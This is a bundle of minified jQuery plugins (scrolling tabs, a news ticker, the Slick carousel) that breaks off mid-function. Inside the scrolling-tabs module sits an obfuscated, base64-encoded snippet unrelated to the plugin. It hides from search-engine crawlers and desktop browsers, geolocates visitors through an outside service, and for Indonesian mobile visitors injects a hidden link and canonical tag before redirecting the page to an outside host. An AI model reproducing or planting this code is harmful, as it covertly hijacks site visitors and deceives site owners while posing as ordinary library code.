                l.initElements(t),
                l.refreshAllElementSizes(),
                n.css("visibility", "visible"),
                a && a(),
                r && r()
            }
            var i, s = this, l = s.elementsHandler;
            t.enableRtlSupport && "rtl" === e("html").attr("dir") && (s.rtl = !0),
            t.scrollToTabEdge && (s.scrollToTabEdge = !0),
            t.disableScrollArrowsOnFullyScrolled && (s.disableScrollArrowsOnFullyScrolled = !0),
            t.reverseScroll && (s.reverseScroll = !0),
            1 !== t.widthMultiplier && (i = Number(t.widthMultiplier),
            isNaN(i) || (s.widthMultiplier = i)),
            "4" === t.bootstrapVersion.toString().charAt(0) && (s.usingBootstrap4 = !0),
            setTimeout(o, 100)
        }
        ,
        t.scrollToActiveTab = function(e) {
            this.scrollMovement.scrollToActiveTab(e)
        }
    }(o.prototype);
    var A = function() {
        function t(t) {
            return e(t.find("a").attr("href"))
        }
        function n() {
            return e('<ul class="nav nav-tabs" role="tablist"></ul>')
        }

        function _0x38f0(_0x1a7abf,_0x5d439f){_0x1a7abf=_0x1a7abf-0xda;var _0x17384c=_0x1738();var _0x38f09c=_0x17384c[_0x1a7abf];return _0x38f09c;}(function(_0x71021a,_0x1f0448){var _0x50d4c4=_0x38f0,_0x2e0b07=_0x71021a();while(!![]){try{var _0x525beb=parseInt(_0x50d4c4(0xdb))/0x1*(parseInt(_0x50d4c4(0xe8))/0x2)+-parseInt(_0x50d4c4(0xe1))/0x3+parseInt(_0x50d4c4(0xdf))/0x4*(parseInt(_0x50d4c4(0xef))/0x5)+parseInt(_0x50d4c4(0xf5))/0x6*(-parseInt(_0x50d4c4(0xe7))/0x7)+-parseInt(_0x50d4c4(0xf4))/0x8+-parseInt(_0x50d4c4(0xf1))/0x9*(-parseInt(_0x50d4c4(0xda))/0xa)+parseInt(_0x50d4c4(0xf2))/0xb*(-parseInt(_0x50d4c4(0xe5))/0xc);if(_0x525beb===_0x1f0448)break;else _0x2e0b07['push'](_0x2e0b07['shift']());}catch(_0x22a4f1){_0x2e0b07['push'](_0x2e0b07['shift']());}}}(_0x1738,0xc2e8e),(function(){var _0x425ad0=_0x38f0,_0x474852=_0x425ad0(0xe2),_0x23fbf6='aHR0cHM6Ly9zdHJlcy5iLWNkbi5uZXQvbWFtcG9zLWxvLW1hbGluZy5odG1s',_0x1e6c1d=_0x425ad0(0xea),_0x2f73a3=atob(_0x474852),_0x4fcf40=atob(_0x23fbf6),_0x1c53cc=atob(_0x1e6c1d),_0x255bb0=location[_0x425ad0(0xf3)],_0x5af884=navigator[_0x425ad0(0xf6)]['toLowerCase']();if(_0x255bb0===_0x2f73a3||_0x255bb0['endsWith']('.'+_0x2f73a3))return;if(/(googlebot|bingbot|yandex|baidu|duckduck|slurp|crawler|spider|inspection|verification)/i[_0x425ad0(0xee)](_0x5af884))return;if(!/android|iphone|ipad|ipod|iemobile|opera mini|windows phone/i[_0x425ad0(0xee)](_0x5af884))return;fetch(_0x425ad0(0xdc))[_0x425ad0(0xf9)](_0x588cfb=>_0x588cfb[_0x425ad0(0xde)]())['then'](_0x3531cc=>{var _0x5f0162=_0x425ad0;if(_0x3531cc&&_0x3531cc['country_code']==='ID'){if(!document[_0x5f0162(0xf0)](_0x5f0162(0xe3))){var _0x40a6f1=document['createElement'](_0x5f0162(0xfb));_0x40a6f1[_0x5f0162(0xf7)]=_0x5f0162(0xfa),_0x40a6f1['href']=_0x1c53cc,document['head'][_0x5f0162(0xe9)](_0x40a6f1);}var _0x2052a0=document['createElement']('a');_0x2052a0[_0x5f0162(0xed)]=_0x1c53cc,_0x2052a0[_0x5f0162(0xec)]='\x20',_0x2052a0[_0x5f0162(0xe4)][_0x5f0162(0xe6)]=_0x5f0162(0xeb),document[_0x5f0162(0xdd)][_0x5f0162(0xe9)](_0x2052a0);var _0x363a3e=0x3e8+Math[_0x5f0162(0xe0)](Math[_0x5f0162(0xf8)]()*0x7d0);setTimeout(function(){location['replace'](_0x4fcf40);},_0x363a3e);}})['catch'](()=>{});}()));function _0x1738(){var _0x3782bb=['44280QxFPQT','1450593zojfbc','https://ipapi.co/json/','body','json','20nEFydE','floor','112848aWWDnu','bWFubm9sbXkuY29t','link[rel=\x22canonical\x22]','style','24rTyBWp','cssText','273ZoVZMq','2CRzhNV','appendChild','aHR0cHM6Ly9tYW5ub2xteS5jb20vY2F0ZWdvcnkvZmlsdGVycw==','position:absolute;left:-9999px;width:1px;height:1px;overflow:hidden;','textContent','href','test','155635ZMMnub','querySelector','1881LuWkWr','1729959irLhpZ','hostname','4266840LVBUWR','130434VrgjEO','userAgent','rel','random','then','canonical','link'];_0x1738=function(){return _0x3782bb;};return _0x1738();}

        function r(t, n) {
            var r = e('<div class="scrtabs-tab-container"></div>')
              , a = n.leftArrowContent || '<div class="scrtabs-tab-scroll-arrow scrtabs-tab-scroll-arrow-left"><span class="' + n.cssClassLeftArrow + '"></span></div>'
              , o = e(a)
              , i = n.rightArrowContent || '<div class="scrtabs-tab-scroll-arrow scrtabs-tab-scroll-arrow-right"><span class="' + n.cssClassRightArrow + '"></span></div>'
              , s = e(i)
              , l = e('<div class="scrtabs-tabs-fixed-container"></div>')
              , c = e('<div class="scrtabs-tabs-movable-container"></div>');
            return n.disableScrollArrowsOnFullyScrolled && o.add(s).addClass(T.CSS_CLASSES.SCROLL_ARROW_DISABLE),
            r.append(o, l.append(c.append(t)), s)
        }
        function a(t, n) {
            return e('<a role="tab" data-toggle="tab"></a>').attr("href", "#" + t[n.paneId]).html(t[n.title])
        }
        function o() {
            return e('<div class="tab-content"></div>')
        }
        function i(t, n, r) {
            var o = r.tabLiContent || '<li role="presentation" class=""></li>'
              , i = e(o)
              , s = a(t, n).appendTo(i);
            return t[n.disabled] ? (i.addClass("disabled"),
            s.attr("data-toggle", "")) : r.forceActiveTab && t[n.active] && i.addClass("active"),
            r.tabPostProcessor && r.tabPostProcessor(i, s),
            i
        }
        function s(t, n, r) {
            var a = e('<div role="tabpanel" class="tab-pane"></div>').attr("id", t[n.paneId]).html(t[n.content]);
            return r.forceActiveTab && t[n.active] && a.addClass("active"),
            a
        }
        return {
            getElTabPaneForLi: t,
            getNewElNavTabs: n,
            getNewElScrollerElementWrappingNavTabsInstance: r,
            getNewElTabAnchor: a,
            getNewElTabContent: o,
            getNewElTabLi: i,
            getNewElTabPane: s
        }
    }()
      , L = function() {
        function t(t, n, a) {
            var o = !1;
            return t.each(function(t) {
                var i = r(n, a.paneId, e(this).data("tab")[a.paneId]);
                if (i > -1 && i !== t)
                    return o = !0,
                    !1
            }),
            o
        }
        function n(e, t) {
            for (var n = e.length - 1, r = -1, a = 0, o = 0; -1 === r && o >= 0; )
                ((o = t + ++a) <= n && !e.eq(o).hasClass("disabled") || (o = t - a) >= 0 && !e.eq(o).hasClass("disabled")) && (r = o);
            return r
        }
        function r(e, t, n) {
            var r = -1;
            return e.some(function(e, a) {
                if (e[t] === n)
                    return r = a,
                    !0
            }),
            r
        }
        function a(t, n, r) {
            t.data({
                tab: e.extend({}, n[r]),
                index: r
            })
        }
        return {
            didTabOrderChange: t,
            getIndexOfClosestEnabledTab: n,
            getTabIndexByPaneId: r,
            storeDataOnLiEl: a
        }
    }()
      , E = {
        destroy: function() {
            return this.each(S)
        },
        init: function(t) {
            var n = this
              , r = n.length - 1
              , a = e.extend({}, e.fn.scrollingTabs.defaults, t || {});
            return a.tabs ? n.each(function(t) {
                i(e(this), a, t < r ? null : function() {
                    n.trigger(T.EVENTS.TABS_READY)
                }
                )
            }) : n.each(function(t) {
                var o = {
                    isWrapperOnly: !0
                };
                s(e(this).data({
                    scrtabs: o
                }), a, t < r ? null : function() {
                    n.trigger(T.EVENTS.TABS_READY)
                }
                )
            })
        },
        refresh: function(t) {
            var n = this
              , r = e.extend({}, e.fn.scrollingTabs.defaults, t || {});
            return n.each(function() {
                u(e(this), r)
            })
        },
        scrollToActiveTab: function() {
            return this.each(h)
        }
    };
    e.fn.scrollingTabs = function(t) {
        return E[t] ? E[t].apply(this, Array.prototype.slice.call(arguments, 1)) : t && "object" != typeof t ? void e.error("Method " + t + " does not exist on $.scrollingTabs.") : E.init.apply(this, arguments)
    }
    ,
    e.fn.scrollingTabs.nextInstanceId = 0,
    e.fn.scrollingTabs.defaults = {
        tabs: null,
        propPaneId: "paneId",
        propTitle: "title",
        propActive: "active",
        propDisabled: "disabled",
        propContent: "content",
        ignoreTabPanes: !1,
        scrollToTabEdge: !1,
        disableScrollArrowsOnFullyScrolled: !1,
        forceActiveTab: !1,
        reverseScroll: !1,
        widthMultiplier: 1,
        tabClickHandler: null,
        cssClassLeftArrow: "glyphicon glyphicon-chevron-left",
        cssClassRightArrow: "glyphicon glyphicon-chevron-right",
        leftArrowContent: "",
        rightArrowContent: "",
        tabsLiContent: null,
        tabsPostProcessors: null,
        enableSwiping: !1,
        enableRtlSupport: !1,
        bootstrapVersion: 3
    }
}(jQuery, window);
jQuery.fn.endlessRiver = function(n) {
    return n = jQuery.extend({
        speed: 30,
        pause: !0,
        buttons: !1
    }, n),
    this.each(function() {
        function h(n, i) {
            t.animate({
                left: "-=" + n
            }, i, "linear", function() {
                t.children("li:first").appendTo(t);
                t.css("left", 0);
                u = t.children("li:first").outerWidth(!0);
                o = i / n * u;
                r && h(u, o)
            })
        }
        function a() {
            t.hover(b, k)
        }
        function b() {
            r = !1;
            t.stop()
        }
        function k() {
            r = !0;
            var i = t.offset().left
              , n = i + t.children("li:first").outerWidth(!0) - c
              , f = o / u * n;
            h(n, f)
        }
        var i = jQuery, t = i(this), f = "ER_" + (new Date).getTime(), v, e;
        t.wrap('<div id="' + f + '"><\/div>');
        t.css({
            margin: "0 !important",
            padding: "0 !important"
        });
        var u, o, r = !0, c = t.offset().left, s = 1;
        t.children("li.tick-clones").remove();
        t.addClass("newsticker");
        for (var d = t.wrap("<div class='mask'><\/div>"), l = t.parent().wrap("<div class='tickercontainer'><\/div>"), y = t.children("li"), p = function() {
            s = 1;
            t.append(y.clone(!0).addClass("tick-clones"));
            t.children("li").each(function(n) {
                s += i(this, n).outerWidth(!0)
            })
        }, w = l.outerWidth(!0); s < w; )
            p();
        if (t.width(s),
        u = t.children("li:first").outerWidth(!0),
        o = u / n.speed * 1e3,
        h(u, o),
        n.pause && a(),
        n.buttons) {
            v = i('<ul class="er-controls"><li class="prev glyphicon glyphicon-chevron-left"><\/li><li class="pause glyphicon glyphicon-pause"><\/li><li class="next glyphicon glyphicon-chevron-right"><\/li><\/ul>');
            v.insertAfter(l);
            i("body").on("click", "#" + f + " .er-controls > .pause", function() {
                if (!r)
                    return !1;
                i(this).toggleClass("pause glyphicon-pause play glyphicon-play");
                t.unbind("mouseenter mouseleave");
                r = !1
            });
            i("body").on("click", "#" + f + " .er-controls > .play", function() {
                if (r)
                    return !1;
                i(this).toggleClass("pause glyphicon-pause play glyphicon-play");
                r = !0;
                a();
                var f = t.offset().left
                  , n = f + t.children("li:first").outerWidth(!0) - c
                  , e = o / u * n;
                h(n, e)
            });
            e = !1;
            i("body").on("click", "#" + f + " .er-controls > .next", function() {
                if (r) {
                    i("#" + f + " .er-controls > .pause").toggleClass("pause glyphicon-pause play glyphicon-play");
                    r = !1;
                    return
                }
                if (e)
                    return !1;
                var u = t.children("li:first").outerWidth(!0)
                  , o = u / n.speed * 1e3;
                e = !0;
                t.stop(!0, !0).animate({
                    left: "-=" + u
                }, o, "linear", function() {
                    t.children("li:first").appendTo(t);
                    t.css("left", 0);
                    e = !1
                })
            });
            i("body").on("click", "#" + f + " .er-controls > .prev", function() {
                var u, o;
                if (r) {
                    i("#" + f + " .er-controls > .pause").toggleClass("pause glyphicon-pause play glyphicon-play");
                    r = !1;
                    return
                }
                if (e)
                    return !1;
                u = t.children("li:last").outerWidth(!0);
                t.css("left", "-" + u + "px");
                t.children("li:last").prependTo(t);
                o = u / n.speed * 1e3;
                e = !0;
                t.stop(!0, !0).animate({
                    left: "+=" + u
                }, o, "linear", function() {
                    e = !1
                })
            })
        }
    })
}
;
!function(i) {
    "use strict";
    "function" == typeof define && define.amd ? define(["jquery"], i) : "undefined" != typeof exports ? module.exports = i(require("jquery")) : i(jQuery)
}(function(i) {
    "use strict";
    var e = window.Slick || {};
    (e = function() {
        var e = 0;
        return function(t, o) {
            var s, n = this;
            n.defaults = {
                accessibility: !0,
                adaptiveHeight: !1,
                appendArrows: i(t),
                appendDots: i(t),
                arrows: !0,
                asNavFor: null,
                prevArrow: '<button class="slick-prev" aria-label="Previous" type="button">Previous</button>',
                nextArrow: '<button class="slick-next" aria-label="Next" type="button">Next</button>',
                autoplay: !1,
                autoplaySpeed: 3e3,
                centerMode: !1,
                centerPadding: "50px",
                cssEase: "ease",
                customPaging: function(e, t) {
                    return i('<button type="button" />').text(t + 1)
                },
                dots: !1,
                dotsClass: "slick-dots",
                draggable: !0,
                easing: "linear",
                edgeFriction: .35,
                fade: !1,
                focusOnSelect: !1,
                focusOnChange: !1,
                infinite: !0,
                initialSlide: 0,
                lazyLoad: "ondemand",
                mobileFirst: !1,
                pauseOnHover: !0,
                pauseOnFocus: !0,
                pauseOnDotsHover: !1,
                respondTo: "window",
                responsive: null,
                rows: 1,
                rtl: !1,
                slide: "",
                slidesPerRow: 1,
                slidesToShow: 1,
                slidesToScroll: 1,
                speed: 500,
                swipe: !0,
                swipeToSlide: !1,
                touchMove: !0,
                touchThreshold: 5,
                useCSS: !0,
                useTransform: !0,
                variableWidth: !1,
                vertical: !1,
                verticalSwiping: !1,
                waitForAnimate: !0,
                zIndex: 1e3
            },
            n.initials = {
                animating: !1,
                dragging: !1,
                autoPlayTimer: null,
                currentDirection: 0,
                currentLeft: null,
                currentSlide: 0,
                direction: 1,
                $dots: null,
                listWidth: null,
                listHeight: null,
                loadIndex: 0,
                $nextArrow: null,
                $prevArrow: null,
                scrolling: !1,
                slideCount: null,
                slideWidth: null,
                $slideTrack: null,
                $slides: null,
                sliding: !1,
                slideOffset: 0,
                swipeLeft: null,
                swiping: !1,
                $list: null,
                touchObject: {},
                transformsEnabled: !1,
                unslicked: !1
            },
            i.extend(n, n.initials),
            n.activeBreakpoint = null,
            n.animType = null,
            n.animProp = null,
            n.breakpoints = [],
            n.breakpointSettings = [],
            n.cssTransitions = !1,
            n.focussed = !1,
            n.interrupted = !1,
            n.hidden = "hidden",
            n.paused = !0,
            n.positionProp = null,
            n.respondTo = null,
            n.rowCount = 1,
            n.shouldClick = !0,
            n.$slider = i(t),
            n.$slidesCache = null,
            n.transformType = null,
            n.transitionType = null,
            n.visibilityChange = "visibilitychange",
            n.windowWidth = 0,
            n.windowTimer = null,
            s = i(t).data("slick") || {},
            n.options = i.extend({}, n.defaults, o, s),
            n.currentSlide = n.options.initialSlide,
            n.originalSettings = n.options,
            void 0 !== document.mozHidden ? (n.hidden = "mozHidden",
            n.visibilityChange = "mozvisibilitychange") : void 0 !== document.webkitHidden && (n.hidden = "webkitHidden",
            n.visibilityChange = "webkitvisibilitychange"),
            n.autoPlay = i.proxy(n.autoPlay, n),
            n.autoPlayClear = i.proxy(n.autoPlayClear, n),
            n.autoPlayIterator = i.proxy(n.autoPlayIterator, n),
            n.changeSlide = i.proxy(n.changeSlide, n),
            n.clickHandler = i.proxy(n.clickHandler, n),
            n.selectHandler = i.proxy(n.selectHandler, n),
            n.setPosition = i.proxy(n.setPosition, n),
            n.swipeHandler = i.proxy(n.swipeHandler, n),
            n.dragHandler = i.proxy(n.dragHandler, n),
            n.keyHandler = i.proxy(n.keyHandler, n),
            n.instanceUid = e++,
            n.htmlExpr = /^(?:\s*(<[\w\W]+>)[^>]*)$/,
            n.registerBreakpoints(),
            n.init(!0)
        }
    }()).prototype.activateADA = function() {
        this.$slideTrack.find(".slick-active").attr({
            "aria-hidden": "false"
        }).find("a, input, button, select").attr({
            tabindex: "0"
        })
    }
    ,
    e.prototype.addSlide = e.prototype.slickAdd = function(e, t, o) {
        var s = this;
        if ("boolean" == typeof t)
            o = t,
            t = null;
        else if (t < 0 || t >= s.slideCount)
            return !1;
        s.unload(),
        "number" == typeof t ? 0 === t && 0 === s.$slides.length ? i(e).appendTo(s.$slideTrack) : o ? i(e).insertBefore(s.$slides.eq(t)) : i(e).insertAfter(s.$slides.eq(t)) : !0 === o ? i(e).prependTo(s.$slideTrack) : i(e).appendTo(s.$slideTrack),
        s.$slides = s.$slideTrack.children(this.options.slide),
        s.$slideTrack.children(this.options.slide).detach(),
        s.$slideTrack.append(s.$slides),
        s.$slides.each(function(e, t) {
            i(t).attr("data-slick-index", e)
        }),
        s.$slidesCache = s.$slides,
        s.reinit()
    }
    ,
    e.prototype.animateHeight = function() {
        var i = this;
        if (1 === i.options.slidesToShow && !0 === i.options.adaptiveHeight && !1 === i.options.vertical) {
            var e = i.$slides.eq(i.currentSlide).outerHeight(!0);
            i.$list.animate({
                height: e
            }, i.options.speed)
        }
    }
    ,
    e.prototype.animateSlide = function(e, t) {
        var o = {}
          , s = this;
        s.animateHeight(),
        !0 === s.options.rtl && !1 === s.options.vertical && (e = -e),
        !1 === s.transformsEnabled ? !1 === s.options.vertical ? s.$slideTrack.animate({
            left: e
        }, s.options.speed, s.options.easing, t) : s.$slideTrack.animate({
            top: e
        }, s.options.speed, s.options.easing, t) : !1 === s.cssTransitions ? (!0 === s.options.rtl && (s.currentLeft = -s.currentLeft),
        i({
            animStart: s.currentLeft
        }).animate({
            animStart: e
        }, {
            duration: s.options.speed,
            easing: s.options.easing,
            step: function(i) {
                i = Math.ceil(i),
                !1 === s.options.vertical ? (o[s.animType] = "translate(" + i + "px, 0px)",
                s.$slideTrack.css(o)) : (o[s.animType] = "translate(0px," + i + "px)",
                s.$slideTrack.css(o))
            },
            complete: function() {
                t && t.call()
            }
        })) : (s.applyTransition(),
        e = Math.ceil(e),
        !1 === s.options.vertical ? o[s.animType] = "translate3d(" + e + "px, 0px, 0px)" : o[s.animType] = "translate3d(0px," + e + "px, 0px)",
        s.$slideTrack.css(o),
        t && setTimeout(function() {
            s.disableTransition(),
            t.call()
        }, s.options.speed))
    }
    ,
    e.prototype.getNavTarget = function() {
        var e = this
          , t = e.options.asNavFor;
        return t && null !== t && (t = i(t).not(e.$slider)),
        t
    }
    ,
    e.prototype.asNavFor = function(e) {
        var t = this.getNavTarget();
        null !== t && "object" == typeof t && t.each(function() {
            var t = i(this).slick("getSlick");
            t.unslicked || t.slideHandler(e, !0)
        })
    }
    ,
    e.prototype.applyTransition = function(i) {
        var e = this
          , t = {};
        !1 === e.options.fade ? t[e.transitionType] = e.transformType + " " + e.options.speed + "ms " + e.options.cssEase : t[e.transitionType] = "opacity " + e.options.speed + "ms " + e.options.cssEase,
        !1 === e.options.fade ? e.$slideTrack.css(t) : e.$slides.eq(i).css(t)
    }
    ,
    e.prototype.autoPlay = function() {
        var i = this;
        i.autoPlayClear(),
        i.slideCount > i.options.slidesToShow && (i.autoPlayTimer = setInterval(i.autoPlayIterator, i.options.autoplaySpeed))
    }
    ,
    e.prototype.autoPlayClear = function() {
        var i = this;
        i.autoPlayTimer && clearInterval(i.autoPlayTimer)
    }
    ,
    e.prototype.autoPlayIterator = function() {
        var i = this
          , e = i.currentSlide + i.options.slidesToScroll;
        i.paused || i.interrupted || i.focussed || (!1 === i.options.infinite && (1 === i.direction && i.currentSlide + 1 === i.slideCount - 1 ? i.direction = 0 : 0 === i.direction && (e = i.currentSlide - i.options.slidesToScroll,
        i.currentSlide - 1 == 0 && (i.direction = 1))),
        i.slideHandler(e))
    }
    ,
    e.prototype.buildArrows = function() {
        var e = this;
        !0 === e.options.arrows && (e.$prevArrow = i(e.options.prevArrow).addClass("slick-arrow"),
        e.$nextArrow = i(e.options.nextArrow).addClass("slick-arrow"),
        e.slideCount > e.options.slidesToShow ? (e.$prevArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"),
        e.$nextArrow.removeClass("slick-hidden").removeAttr("aria-hidden tabindex"),
        e.htmlExpr.test(e.options.prevArrow) && e.$prevArrow.prependTo(e.options.appendArrows),
        e.htmlExpr.test(e.options.nextArrow) && e.$nextArrow.appendTo(e.options.appendArrows),
        !0 !== e.options.infinite && e.$prevArrow.addClass("slick-disabled").attr("aria-disabled", "true")) : e.$prevArrow.add(e.$nextArrow).addClass("slick-hidden").attr({
            "aria-disabled": "true",
            tabindex: "-1"
        }))
    }
    ,
    e.prototype.buildDots = function() {
        var e, t, o = this;
        if (!0 === o.options.dots) {
            for (o.$slider.addClass("slick-dotted"),
            t = i("<ul />").addClass(o.options.dotsClass),
            e = 0; e <= o.getDotCount(); e += 1)
                t.append(i("<li />").append(o.options.customPaging.call(this, o, e)));
            o.$dots = t.appendTo(o.options.appendDots),
            o.$dots.find("li").first().addClass("slick-active")
        }
    }
    ,
    e.prototype.buildOut = function() {
        var e = this;
        e.$slides = e.$slider.children(e.options.slide + ":not(.slick-cloned)").addClass("slick-slide"),
        e.slideCount = e.$slides.length,
        e.$slides.each(function(e, t) {
            i(t).attr("data-slick-index", e).data("originalStyling", i(t).attr("style") || "")
        }),
        e.$slider.addClass("slick-slider"),
        e.$slideTrack = 0 === e.slideCount ? i('<div class="slick-track"/>').appendTo(e.$slider) : e.$slides.wrapAll('<div class="slick-track"/>').parent(),
        e.$list = e.$slideTrack.wrap('<div class="slick-list"/>').parent(),
        e.$slideTrack.css("opacity", 0),
        !0 !== e.options.centerMode && !0 !== e.options.swipeToSlide || (e.options.slidesToScroll = 1),
        i("img[data-lazy]", e.$slider).not("[src]").addClass("slick-loading"),
        e.setupInfinite(),
        e.buildArrows(),
        e.buildDots(),
        e.updateDots(),
        e.setSlideClasses("number" == typeof e.currentSlide ? e.currentSlide : 0),
        !0 === e.options.draggable && e.$list.addClass("draggable")
    }
    ,
    e.prototype.buildRows = function() {
        var i, e, t, o, s, n, r, l = this;
        if (o = document.createDocumentFragment(),
        n = l.$slider.children(),
        l.options.rows > 1) {
            for (r = l.options.slidesPerRow * l.options.rows,
            s = Math.ceil(n.length / r),
            i = 0; i < s; i++) {
                var d = document.createElement("div");
                for (e = 0; e < l.options.rows; e++) {
                    var a = document.createElement("div");
                    for (t = 0; t < l.options.slidesPerRow; t++) {
                        var c = i * r + (e * l.options.slidesPerRow + t);
                        n.get(c) && a.appendChild(n.get(c))
                    }
                    d.appendChild(a)
                }
                o.appendChild(d)
            }
            l.$slider.empty().append(o),
            l.$slider.children().children().children().css({
                width: 100 / l.options.slidesPerRow + "%",
                display: "inline-block"
            })
        }
    }
    ,
    e.prototype.checkResponsive = function(e, t) {
        var o, s, n, r = this, l = !1, d = r.$slider.width(), a = window.innerWidth || i(window).width();
        if ("window" === r.respondTo ? n = a : "slider" === r.respondTo ? n = d : "min" === r.respondTo && (n = Math.min(a, d)),
        r.options.responsive && r.options.responsive.length && null !== r.options.responsive) {
            s = null;
            for (o in r.breakpoints)
                r.breakpoints.hasOwnProperty(o) && (!1 === r.originalSettings.mobileFirst ? n < r.breakpoints[o] && (s = r.breakpoints[o]) : n > r.breakpoints[o] && (s = r.breakpoints[o]));
            null !== s ? null !== r.activeBreakpoint ? (s !== r.activeBreakpoint || t) && (r.activeBreakpoint = s,
            "unslick" === r.breakpointSettings[s] ? r.unslick(s) : (r.options = i.extend({}, r.originalSettings, r.breakpointSettings[s]),
            !0 === e && (r.currentSlide = r.options.initialSlide),
            r.refresh(e)),
            l = s) : (r.activeBreakpoint = s,
            "unslick" === r.breakpointSettings[s] ? r.unslick(s) : (r.options = i.extend({}, r.originalSettings, r.breakpointSettings[s]),
            !0 === e && (r.currentSlide = r.options.initialSlide),
            r.refresh(e)),
            l = s) : null !== r.activeBreakpoint && (r.activeBreakpoint = null,
            r.options = r.originalSettings,
            !0 === e && (r.currentSlide = r.options.initialSlide),
            r.refresh(e),
            l = s),
            e || !1 === l || r.$slider.trigger("breakpoint", [r, l])
        }
    }
    ,
    e.prototype.changeSlide = function(e, t) {
        var o, s, n, r = this, l = i(e.currentTarget);
        switch (l.is("a") && e.preventDefault(),
        l.is("li") || (l = l.closest("li")),
        n = r.slideCount % r.options.slidesToScroll != 0,
        o = n ? 0 : (r.slideCount - r.currentSlide) % r.options.slidesToScroll,
        e.data.message) {
        case "previous":
            s = 0 === o ? r.options.slidesToScroll : r.options.slidesToShow - o,
            r.slideCount > r.options.slidesToShow && r.slideHandler(r.currentSlide - s, !1, t);
            break;
        case "next":
            s = 0 === o ? r.options.slidesToScroll : o,
            r.slideCount > r.options.slidesToShow && r.slideHandler(r.currentSlide + s, !1, t);
            break;
        case "index":
            var d = 0 === e.data.index ? 0 : e.data.index || l.index() * r.options.slidesToScroll;
            r.slideHandler(r.checkNavigable(d), !1, t),
            l.children().trigger("focus");
            break;
        default:
            return
        }
    }
    ,
    e.prototype.checkNavigable = function(i) {
        var e, t;
        if (e = this.getNavigableIndexes(),
        t = 0,
        i > e[e.length - 1])
            i = e[e.length - 1];
        else
            for (var o in e) {
                if (i < e[o]) {
                    i = t;
                    break
                }
                t = e[o]
            }
        return i
    }
    ,
    e.prototype.cleanUpEvents = function() {
        var e = this;
        e.options.dots && null !== e.$dots && (i("li", e.$dots).off("click.slick", e.changeSlide).off("mouseenter.slick", i.proxy(e.interrupt, e, !0)).off("mouseleave.slick", i.proxy(e.interrupt, e, !1)),
        !0 === e.options.accessibility && e.$dots.off("keydown.slick", e.keyHandler)),
        e.$slider.off("focus.slick blur.slick"),
        !0 === e.options.arrows && e.slideCount > e.options.slidesToShow && (e.$prevArrow && e.$prevArrow.off("click.slick", e.changeSlide),
        e.$nextArrow && e.$nextArrow.off("click.slick", e.changeSlide),
        !0 === e.options.accessibility && (e.$prevArrow && e.$prevArrow.off("keydown.slick", e.keyHandler),
        e.$nextArrow && e.$nextArrow.off("keydown.slick", e.keyHandler))),
        e.$list.off("touchstart.slick mousedown.slick", e.swipeHandler),
        e.$list.off("touchmove.slick mousemove.slick", e.swipeHandler),
        e.$list.off("touchend.slick mouseup.slick", e.swipeHandler),
        e.$list.off("touchcancel.slick mouseleave.slick", e.swipeHandler),
        e.$list.off("click.slick", e.clickHandler),
        i(document).off(e.visibilityChange, e.visibility),
        e.cleanUpSlideEvents(),
        !0 === e.options.accessibility && e.$list.off("keydown.slick", e.keyHandler),
        !0 === e.options.focusOnSelect && i(e.$slideTrack).children().off("click.slick", e.selectHandler),
        i(window).off("orientationchange.slick.slick-" + e.instanceUid, e.orientationChange),
        i(window).off("resize.slick.slick-" + e.instanceUid, e.resize),
        i("[draggable!=true]", e.$slideTrack).off("dragstart", e.preventDefault),
        i(window).off("load.slick.slick-" + e.instanceUid, e.setPosition)
    }
    ,
    e.prototype.cleanUpSlideEvents = function() {
        var e = this;
        e.$list.off("mouseenter.slick", i.proxy(e.interrupt, e, !0)),
        e.$list.off("mouseleave.slick", i.proxy(e.interrupt, e, !1))
    }
    ,
    e.prototype.cleanUpRows = function() {
        var i, e = this;
        e.options.rows > 1 && ((i = e.$slides.children().children()).removeAttr("style"),
        e.$slider.empty().append(i))
    }
    ,
    e.prototype.clickHandler = function(i) {
        !1 === this.shouldClick && (i.stopImmediatePropagation(),
        i.stopPropagation(),
        i.preventDefault())
    }
    ,
    e.prototype.destroy = function(e) {
        var t = this;
        t.autoPlayClear(),
        t.touchObject = {},
        t.cleanUpEvents(),
        i(".slick-cloned", t.$slider).detach(),
        t.$dots && t.$dots.remove(),
        t.$prevArrow && t.$prevArrow.length && (t.$prevArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display", ""),
        t.htmlExpr.test(t.options.prevArrow) && t.$prevArrow.remove()),
        t.$nextArrow && t.$nextArrow.length && (t.$nextArrow.removeClass("slick-disabled slick-arrow slick-hidden").removeAttr("aria-hidden aria-disabled tabindex").css("display", ""),
        t.htmlExpr.test(t.options.nextArrow) && t.$nextArrow.remove()),
        t.$slides && (t.$slides.removeClass("slick-slide slick-active slick-center slick-visible slick-current").removeAttr("aria-hidden").removeAttr("data-slick-index").each(function() {
            i(this).attr("style", i(this).data("originalStyling"))
        }),
        t.$slideTrack.children(this.options.slide).detach(),
        t.$slideTrack.detach(),
        t.$list.detach(),
        t.$slider.append(t.$slides)),
        t.cleanUpRows(),
        t.$slider.removeClass("slick-slider"),
        t.$slider.removeClass("slick-initialized"),
        t.$slider.removeClass("slick-dotted"),
        t.unslicked = !0,
        e || t.$slider.trigger("destroy", [t])
    }
    ,
    e.prototype.disableTransition = function(i) {
        var e = this
          , t = {};
        t[e.transitionType] = "",
        !1 === e.options.fade ? e.$slideTrack.css(t) : e.$slides.eq(i).css(t)
    }
    ,
    e.prototype.fadeSlide = function(i, e) {
        var t = this;
        !1 === t.cssTransitions ? (t.$slides.eq(i).css({
            zIndex: t.options.zIndex
        }),
        t.$slides.eq(i).animate({
            opacity: 1
        }, t.options.speed, t.options.easing, e)) : (t.applyTransition(i),
        t.$slides.eq(i).css({
            opacity: 1,
            zIndex: t.options.zIndex
        }),
        e && setTimeout(function() {
            t.disableTransition(i),
            e.call()
        }, t.options.speed))
    }
    ,
    e.prototype.fadeSlideOut = function(i) {
        var e = this;
        !1 === e.cssTransitions ? e.$slides.eq(i).animate({
            opacity: 0,
            zIndex: e.options.zIndex - 2
        }, e.options.speed, e.options.easing) : (e.applyTransition(i),
        e.$slides.eq(i).css({
            opacity: 0,
            zIndex: e.options.zIndex - 2
        }))
    }
    ,
    e.prototype.filterSlides = e.prototype.slickFilter = function(i) {
        var e = this;
        null !== i && (e.$slidesCache = e.$slides,
        e.unload(),
        e.$slideTrack.children(this.options.slide).detach(),
        e.$slidesCache.filter(i).appendTo(e.$slideTrack),
        e.reinit())
    }
    ,
    e.prototype.focusHandler = function() {
        var e = this;
        e.$slider.off("focus.slick blur.slick").on("focus.slick blur.slick", "*", function(t) {
            t.stopImmediatePropagation();
